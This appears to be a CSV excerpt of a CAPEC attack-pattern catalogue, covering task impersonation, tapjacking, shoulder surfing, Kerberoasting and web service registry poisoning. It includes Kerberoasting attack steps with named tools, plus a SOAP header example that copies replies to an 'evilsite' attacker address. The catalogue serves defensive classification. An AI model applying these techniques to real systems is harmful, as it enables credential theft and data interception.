504,"Task Impersonation",Standard,Stable,"An adversary, through a previously installed malicious application, impersonates an expected or routine task in an attempt to steal sensitive information or leverage a user's privileges.","",Medium,High,"::NATURE:ChildOf:CAPEC ID:173::","::STEP:1:PHASE:Explore:DESCRIPTION:[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing sensitive information.:TECHNIQUE:Determine what tasks prompt a user for their credentials.:TECHNIQUE:Determine what tasks may prompt a user to authorize a process to execute with elevated privileges.::STEP:2:PHASE:Exploit:DESCRIPTION:[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials or to ride the user's privileges.:TECHNIQUE:Prompt a user for their credentials, while making the user believe the credential request is legitimate.:TECHNIQUE:Prompt a user to authorize a task to run with elevated privileges, while making the user believe the request is legitimate.::","::The adversary must already have access to the target system via some means.::A legitimate task must exist that an adversary can impersonate to glean credentials.::The user's privileges allow them to execute certain tasks with elevated privileges.::","::SKILL:Once an adversary has gained access to the target system, impersonating a task is trivial.:LEVEL:Low::","::Malware or some other means to initially comprise the target system.::Additional malware to impersonate a legitimate task.::","::Credential or permission elevation prompts that appear illegitimate or unexpected.::","::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::","::The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.::","::An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.::An adversary prompts a user to authorize an elevation of privileges, implying that a background task needs additional permissions to execute. The user accepts the privilege elevation, allowing the adversary to execute additional malware or tasks with the user's privileges.::","::1021::","TAXONOMY NAME:ATTACK:ENTRY ID:1036.004:ENTRY NAME:Masquerading: Masquerade Task or Service::","",
505,"Scheme Squatting",Detailed,Draft,"An adversary, through a previously installed malicious application, registers for a URL scheme intended for a target application that has not been installed. Thereafter, messages intended for the target application are handled by the malicious application. Upon receiving a message, the malicious application displays a screen that mimics the target application, thereby convincing the user to enter sensitive information. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user as they think that they are interacting with the intended target application.","",,,"::NATURE:ChildOf:CAPEC ID:616::","","","","","","","::The only known mitigation to this attack is to avoid installing the malicious application on the device. Applications usually have to declare the schemes they wish to register, so detecting this during a review is feasible.::","","","","",
506,"Tapjacking",Standard,Draft,"An adversary, through a previously installed malicious application, displays an interface that misleads the user and convinces them to tap on an attacker desired location on the screen. This is often accomplished by overlaying one screen on top of another while giving the appearance of a single interface. There are two main techniques used to accomplish this. The first is to leverage transparent properties that allow taps on the screen to pass through the visible application to an application running in the background. The second is to strategically place a small object (e.g., a button or text field) on top of the visible screen and make it appear to be a part of the underlying application. In both cases, the user is convinced to tap on the screen but does not realize the application that they are interacting with.","",Low,Low,"::NATURE:ChildOf:CAPEC ID:173::","","::This pattern of attack requires the ability to execute a malicious application on the user's device. This malicious application is used to present the interface to the user and make the attack possible.::","","","","","","","::1021::","","",
507,"Physical Theft",Meta,Draft,"An adversary gains physical access to a system or device through theft of the item. Possession of a system or device enables a number of unique attacks to be executed and often provides the adversary with an extended timeframe for which to perform an attack. Most protections put in place to secure sensitive information can be defeated when an adversary has physical access and enough time.","",,,"","","::This type of attack requires the existence of a physical target that an adversary believes hosts something of value.::","","","","","::To mitigate this type of attack, physical security techniques such as locks doors, alarms, and monitoring of targets should be implemented.::","","","","",
508,"Shoulder Surfing",Detailed,Draft,"In a shoulder surfing attack, an adversary observes an unaware individual's keystrokes, screen content, or conversations with the goal of obtaining sensitive information. One motive for this attack is to obtain sensitive information about the target for financial, personal, political, or other gains. From an insider threat perspective, an additional motive could be to obtain system/application credentials or cryptographic keys. Shoulder surfing attacks are accomplished by observing the content over the victim's shoulder, as implied by the name of this attack.","",High,High,"::NATURE:ChildOf:CAPEC ID:651::NATURE:CanPrecede:CAPEC ID:560::","","::The adversary typically requires physical proximity to the target's environment, in order to observe their screen or conversation. This may not be the case if the adversary is able to record the target and obtain sensitive information upon review of the recording.::","::SKILL:In most cases, an adversary can simply observe and retain the desired information.:LEVEL:Low::","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:LIKELIHOOD:High::","::Be mindful of your surroundings when discussing or viewing sensitive information in public areas.::Pertaining to insider threats, ensure that sensitive information is not displayed to nor discussed around individuals without need-to-know access to said information.::","::An adversary can capture a target's banking credentials and transfer money to adversary-controlled accounts.::An adversary observes the target's mobile device lock screen pattern/passcode and then steals the device, which can now be unlocked.::An insider could obtain database credentials for an application and sell the credentials on the black market.::An insider overhears a conversation pertaining to classified information, which could then be posted on an anonymous online forum.::","::200::359::","","",
509,"Kerberoasting",Detailed,Stable,"Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.","",,High,"::NATURE:ChildOf:CAPEC ID:652::NATURE:CanPrecede:CAPEC ID:151::","::STEP:1:PHASE:Explore:DESCRIPTION:Scan for user accounts with set SPN values:TECHNIQUE:These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means.::STEP:2:PHASE:Explore:DESCRIPTION:Request service tickets:TECHNIQUE:Using user account's SPN value, request other service tickets from Active Directory::STEP:3:PHASE:Experiment:DESCRIPTION:Extract ticket and save to disk:TECHNIQUE:Certain tools like Mimikatz can extract local tickets and save them to memory/disk.::STEP:4:PHASE:Exploit:DESCRIPTION:Crack the encrypted ticket to harvest plain text credentials:TECHNIQUE:Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack.::","::The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.::The adversary requires use of a third-party credential harvesting tool (e.g., Mimikatz).::The adversary requires a brute force tool.::","::SKILL::LEVEL:Medium::","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Gain Privileges::","::Monitor system and domain logs for abnormal access.::Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity, and they should expire after a period of time.::Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.::Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.::","::PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]::","::522::308::309::294::263::262::521::","TAXONOMY NAME:ATTACK:ENTRY ID:1558.003:ENTRY NAME:Steal or Forge Kerberos Tickets:Kerberoasting::","",
51,"Poison Web Service Registry",Detailed,Draft,"SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.","",High,Very High,"::NATURE:ChildOf:CAPEC ID:203::","::STEP:1:PHASE:Explore:DESCRIPTION:[Find a target SOA or Web Service] The adversary must first indentify a target SOA or Web Service.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine desired outcome] Because poisoning a web service registry can have different outcomes, the adversary must decide how they wish to effect the webservice.:TECHNIQUE:An adversary can perform a denial of service attack on a web service.:TECHNIQUE:An adversary can redirect requests or responses to a malicious service.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine if a malicious service needs to be created] If the adversary wishes to redirect requests or responses, they will need to create a malicious service to redirect to.:TECHNIQUE:Create a service to that requests are sent to in addition to the legitimate service and simply record the requests.:TECHNIQUE:Create a service that will give malicious responses to a service provider.:TECHNIQUE:Act as a malicious service provider and respond to requests in an arbitrary way.::STEP:4:PHASE:Exploit:DESCRIPTION:[Poison Web Service Registry] Based on the desired outcome, poison the web service registry. This is done by altering the data at rest in the registry or uploading malicious content by spoofing a service provider.:TECHNIQUE:Intercept and change WS-Adressing headers to route to a malicious service or service provider.:TECHNIQUE:Provide incorrect information in schema or metadata to cause a denial of service.:TECHNIQUE:Delete information about service procider interfaces to cause a denial of service.::","::The attacker must be able to write to resources or redirect access to the service registry.::","::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::","::Capability to directly or indirectly modify registry resources::","","::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::","::Design: Enforce principle of least privilege::Design: Harden registry server and file access permissions::Implementation: Implement communications to and from the registry using secure protocols::","::WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime. <S:Header><wsa:MessageID>http://example.com/Message </wsa:MessageID><wsa:ReplyTo><wsa:Address>http://valid.example/validClient</wsa:Address> </wsa:ReplyTo><wsa:ReplyTo><wsa:Address>http://evilsite/evilClient</wsa:Address> </wsa:ReplyTo><wsa:FaultTo><wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address> </wsa:FaultTo> </S:Header> In this example evilsite is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault.::","::285::74::693::","","",